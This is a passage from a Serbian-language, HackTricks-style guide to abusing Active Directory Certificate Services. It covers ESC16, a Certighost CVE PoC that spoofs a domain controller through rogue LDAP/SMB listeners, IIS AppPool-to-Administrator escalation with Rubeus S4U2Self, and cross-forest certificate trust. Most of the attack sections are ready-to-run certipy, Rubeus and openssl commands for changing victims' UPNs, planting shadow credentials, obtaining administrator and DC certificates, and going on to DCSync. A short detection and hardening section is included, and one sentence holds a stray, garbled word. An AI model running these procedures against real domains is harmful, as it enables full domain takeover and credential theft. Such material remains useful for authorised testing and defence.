    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Korak 3: Autentifikujte se kao privilegovani korisnik koristeći „on-behalf-of“ sertifikat.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Bezbednosno proširenje je onemogućeno na CA (globalno)-ESC16

### Objašnjenje

**ESC16 (eskalacija privilegija zbog nedostajućeg proširenja szOID_NTDS_CA_SECURITY_EXT)** opisuje globalno potiskivanje SID proširenja **szOID_NTDS_CA_SECURITY_EXT** na CA. Ovo je pokazatelj konfiguracije, a ne dokaz da se sertifikat može koristiti za autentifikaciju kao drugi nalog. Za impersonaciju je takođe potrebna kontrola nad relevantnim atributima naloga ili mapiranjem, šablon koji dozvoljava upis i služi za autentifikaciju klijenta i putanja za mapiranje sertifikata koju prihvata stvarni kontroler domena ili servis. Zakrpljeni KDC u režimu Full Enforcement odbacuje sertifikate bez SID proširenja, osim ako imaju drugo jako mapiranje; Kerberos procedura zasnovana samo na UPN-u u nastavku odnosi se na starije KDC-ove ili KDC-ove u režimu kompatibilnosti koji i dalje prihvataju slabo mapiranje. Pogledajte [Microsoft-ove smernice za mapiranje sertifikata i sprovođenje pravila](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Možete pogledati i ovaj članak da biste saznali više o detaljnom principu:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Zloupotreba

Sledeći istorijski Kerberos primer zasnovan samo na UPN-u preuzet je iz [Certipy dokumentacije za ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Za njega je potreban KDC koji i dalje prihvata tako dobijeno slabo mapiranje; `StrongCertificateBindingEnforcement=1` više nije podržana opcija za zaobilaženje nakon bezbednosnog ažuriranja za Windows od 9. septembra 2025.<sup>[[14]](#references)</sup>

Da biste utvrdili da li je okruženje Active Directory Certificate Services (AD CS) podložno **ESC16** Erotiske

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Korak 1: Pročitajte početni UPN naloga žrtve (opciono - za vraćanje u prethodno stanje).**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Korak 2: Ažurirajte UPN naloga žrtve tako da odgovara `sAMAccountName` ciljnog administratora.**  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Korak 3: (Ako je potrebno) Pribavite akreditive za „žrtvin“ nalog (npr. putem Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Korak 4: Zatražite sertifikat kao korisnik „žrtva“ pomoću template-a za autentifikaciju klijenta u koji nalog može da se upiše (npr. „User“) na CA konfigurisanom za ESC16.** CA izostavlja SID bezbednosno proširenje iz izdatog sertifikata, ali to samo po sebi ne uspostavlja upotrebljivo mapiranje za autentifikaciju. Podesite promenljivu okruženja za Kerberos keš akreditiva (shell komanda):

```bash
export KRB5CCNAME=victim.ccache
```

Zatim zatražite sertifikat:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Korak 5: Vratite UPN naloga „žrtve” na prethodnu vrednost.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Korak 6: Na starijem KDC-u ili KDC-u u režimu kompatibilnosti koji prihvata ovo slabo mapiranje, autentifikujte se kao ciljni administrator.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Objašnjenje

**Certighost** zloupotrebljava **AD CS enrollment chase / callback path** u kojem CA veruje atributima zahteva koje je dostavio podnosilac i koristi ih da utvrdi identitet koji treba da bude unet u izdat sertifikat. U javnom PoC-u, prilagođeni zahtev uključuje:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP pod kontrolom napadača sa kojim će CA uspostaviti vezu
- **`rmd`**: **DNS ime ciljnog Domain Controllera** koje treba lažno predstaviti

Ako CA prati taj chase, povezaće se s napadačem preko **SMB/LSA (`445`)** i **LDAP (`389`)**. Napadač koristi **stvarni machine account** (obično kreiran pomoću podrazumevanog **`ms-DS-MachineAccountQuota`**) kako bi se callback sesija autentifikovala kao važeći domenski principal, dok rogue servisi vraćaju atribute identiteta **ciljnog DC-a**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ako CA **ne povezuje kriptografski vraćeni identitet sa autentifikovanim callback principalom**, može da izda sertifikat za **Domain Controller**, iako se sesija autentifikovala pomoću machine accounta pod kontrolom napadača. Zbog toga se ova ranjivost konceptualno razlikuje od **Certifried**: umesto menjanja AD atributa kao što je `dNSHostName`, napadač **zamenjuje podatke o identitetu tokom CA callback razrešavanja**.<sup>[[2]](#references)</sup>

**Korisni preduslovi:**

- **Domenski kredencijali** sa niskim privilegijama
- Mogućnost **kreiranja ili ponovnog korišćenja computer accounta**
- Mrežna dostupnost **CA-a** do portova `389` i `445` pod kontrolom napadača
- Ranjiva / nezakrpljena putanja CA zahteva (Microsoft ažuriranje od **14. jula 2026.** dodalo je **DC validaciju za `cdc`** i **poređenje razrešenog SID-a**)

Dobijeni **`.pfx`** zatim može da se koristi za **PKINIT**, čime se dobijaju **`.ccache`** i, u toku rada objavljenog PoC-a, **NT hash ciljnog DC-a** — što je obično dovoljno za **potpuno kompromitovanje domena**.

### Zloupotreba

Javni PoC automatizuje ceo lanac:<sup>[[1]](#references)</sup>

1. Kreirati ili ponovo iskoristiti **machine account** pod kontrolom napadača.
2. Pokrenuti rogue LDAP i SMB/LSA listeners na portovima `389` i `445`.
3. Poslati zahtev za sertifikat koji sadrži atribute **`cdc`** pod kontrolom napadača i ciljni atribut **`rmd`**.
4. Pustiti CA da se autentifikuje na rogue listeners pomoću kontrolisanog machine accounta, ali na upite o identitetu odgovoriti atributima **ciljnog DC-a**.
5. Dobiti CA-potpisan **DC sertifikat**, a zatim ga koristiti za **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Korisne runtime zastavice iz PoC-a:

- `--listener <ip>`: eksplicitno bira callback IP adresu koja se oglašava u `cdc`
- `--computer-name <NAME$>`: ponovo koristi postojeći machine account umesto kreiranja novog

**Operativne napomene:**

- Za PoC je potreban **root** jer vezuje **privilegovane portove** `389` i `445`.
- Uspešna eksploatacija lokalno upisuje **DC `.pfx`** i **Kerberos `.ccache`**.
- Pošto se sertifikat mapira na nalog **Domain Controller-a**, naredni koraci mogu uključivati **Kerberos autentifikaciju zasnovanu na sertifikatu**, **DCSync** i ponovnu upotrebu pribavljenog **NT hash-a mašine**.<sup>[[2]](#references)</sup>

## Upis IIS AppPool-a radi sticanja privilegija Administrator-a na istom hostu

IIS pool koji radi kao `ApplicationPoolIdentity` koristi **computer account** svog hosta za odlazni pristup mrežnim resursima. Zato izvršavanje koda kao `IIS AppPool\<POOL>` ostaje niskoprivilegovano u lokalnom tokenu, ali može da pošalje AD CS zahtev koji CA autentifikuje kao `HOST$`; ovo je promena odlaznog identiteta, a ne impersonacija tokena ili lokalna eskalacija privilegija u stilu Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Ovaj lanac zahteva IIS host pridružen domenu, Enterprise CA dostupan preko RPC-a, objavljen template za machine autentifikaciju za koji računar ima prava upisa, podršku za PKINIT i dostupnost KDC-a/SMB-a. Prilagođeni pool identity menja odlazni principal, zato proverite da pool zaista koristi `ApplicationPoolIdentity` pre nego što pretpostavite да је то `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Upis pomoću ključa pod kontrolom napadača

Generišite par ključeva i CSR van IIS servera i sačuvajte privatni ključ. Sa kompromitovanog worker-a pošaljite **samo CSR**. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) instancira `CertificateAuthority.Request`, postavlja `CertificateTemplate:Machine`, poziva `ICertRequest::Submit` i vraća izdat sertifikat. Koristite konfiguracioni string CA-a `CAHOST\CA-NAME`; uobičajeni `Machine` template sastavlja subject iz AD-a, tako da nisu potrebni podaci o subject/SAN-u koje dostavlja podnosilac zahteva.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Kombinujte vraćeni sertifikat sa **odgovarajućim sačuvanim ključem**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` funkcioniše samo ako Windows već može da poveže sertifikat sa dostupnim privatnim ključem; za odvojene PEM fajlove eksplicitno napravite PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Koristite PFX za PKINIT i sačuvajte vraćeni TGT računara u base64 formatu, umesto da ga odmah ubacite:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self plus zamena servisa na istom hostu

S4U2Self omogućava servisu da pribavi tiket **za sebe** koji sadrži podatke o autorizaciji drugog korisnika. Pomoću TGT-a računara, Rubeus može da zatraži taj tiket za privilegovanog korisnika, da u vraćenom KRB-CRED-u prepravi naziv servisa u CIFS i da ga ubaci. Ovo je lokalni primitiv „delegate to thyself“: ne zahteva S4U2Proxy niti unos `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Zamenjena karta može da se koristi samo za servise na **istom nalogu/ključu računara** (ovde, CIFS na `HOST`). To nije ponovo upotrebljiva Administrator karta za druge računare u domenu. Takođe, prikazani rezultat je privilegovan SMB/pristup sistemu datoteka kao Administrator; za pokretanje procesa sa lokalnim `NT AUTHORITY\SYSTEM` i dalje je potreban zaseban korak udaljenog izvršavanja.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detekcija i ojačavanje bezbednosti

- Na CA-u korelišite događaje Certification Services **4886** (zahtev primljen) i **4887** (sertifikat izdat) kako biste otkrili neočekivane zahteve za šablon `Machine` koje podnose nalozi IIS servera.<sup>[[19]](#references)[[24]](#references)</sup>
- Na DC-ovima, događaj **4768** sadrži polja sertifikata kada se koristi predautentifikacija sertifikatom; upozoravajte na neuobičajene PKINIT TGT zahteve za naloge veb-servera. Zatim proverite zahteve **4769** koji uključuju privilegovani lažno predstavljeni identitet i isti host. Pošto Rubeus `/altservice` menja ime usluge u KRB-CRED-u na strani klijenta, nemojte zahtevati da ime usluge u 4769 na DC-u bude `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Potražite slučajeve u kojima `w3wp.exe` pristupa CA RPC krajnjim tačkama, neočekivano kreiranje ASPX datoteka, pristup administratorskim deljenim resursima uz Kerberos autentifikaciju i aktivnosti izvlačenja tajni. Gde je moguće, ograničite pristup sloja aplikacija CA RPC/KDC/SMB resursima i uklonite prava za upisivanje računara ili šablone za autentifikaciju računara koji nisu operativno neophodni.<sup>[[19]](#references)</sup>

## Kompromitovanje šuma pomoću sertifikata, objašnjeno pasivnim glasom

### Rušenje poverenja između šuma kompromitovanjem CA-ova

Konfiguracija za **upisivanje u sertifikate između šuma** relativno je jednostavna. Administratori **objavljuju sertifikat korenskog CA-a** iz šume resursa **u šumama naloga**, a sertifikati **enterprise CA-ova** iz šume resursa **dodaju se u kontejnere `NTAuthCertificates` i AIA u svakoj šumi naloga**. To znači da ovaj raspored daje **CA-u u šumi resursa potpunu kontrolu** nad svim drugim šumama za koje upravlja PKI-jem. Ako napadači **kompromituju ovaj CA**, mogu da **falsifikuju sertifikate** za sve korisnike u šumama resursa i naloga, čime se narušava bezbednosna granica šume.<sup>[[6]](#references)</sup>

### Prava za upisivanje dodeljena stranim principal-ima

U okruženjima sa više šuma treba biti oprezan sa Enterprise CA-ovima koji **objavljuju šablone sertifikata** koji **Authenticated Users ili stranim principal-ima** (korisnicima/grupama izvan šume kojoj Enterprise CA pripada) daju **prava za upisivanje i uređivanje**.\
Pri autentifikaciji preko poverenja, AD dodaje **Authenticated Users SID** u korisnikov token. Zato, ako domen ima Enterprise CA sa šablonom koji **dodeljuje prava za upisivanje grupi Authenticated Users**, korisnik iz druge šume potencijalno može da **upisuje u šablon**. Isto tako, ako šablon **izričito dodeljuje prava za upisivanje stranom principal-u**, time se **uspostavlja odnos kontrole pristupa između šuma**, koji principal-u iz jedne šume omogućava da **upisuje u šablon iz druge šume**.

Oba slučaja dovode do **povećanja površine napada** između šuma. Napadač bi mogao da iskoristi postavke šablona sertifikata kako bi stekao dodatne privilegije u stranom domenu.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repozitorijum](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Tehnička analiza Certighost-a](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Zloupotreba Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, nove metode autentifikacije i zahteva, i još mnogo toga](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Zloupotreba mapiranja naloga pomoću Key Trust-a za preuzimanje naloga](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Priča o (ne)pravilnoj upotrebi Enhanced Key-a](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relay napadi na AD Certificate Services preko RPC-a](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell pristup ADCS CA-u pomoću YubiHSM-a](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Tehnika zloupotrebe ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Tehnika zloupotrebe ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Eskalacija privilegija (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Nije samo još jedan AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Pogrešna konfiguracija i iskorišćavanje](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Ponovno razmatranje „Delegate 2 Thyself“](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS PoC za upisivanje](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Eskalacija privilegija iz IIS AppPool-a preko AD CS RPC krajnje tačke](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Identiteti skupova aplikacija](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – komanda pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Revizija Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Događaj 4768: Zatražena je Kerberos autentifikaciona karta](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Događaj 4769: Zatražena je Kerberos karta za uslugu](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – Komplet alata za iskorišćavanje AD CS-a pomoću PowerShell-a](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
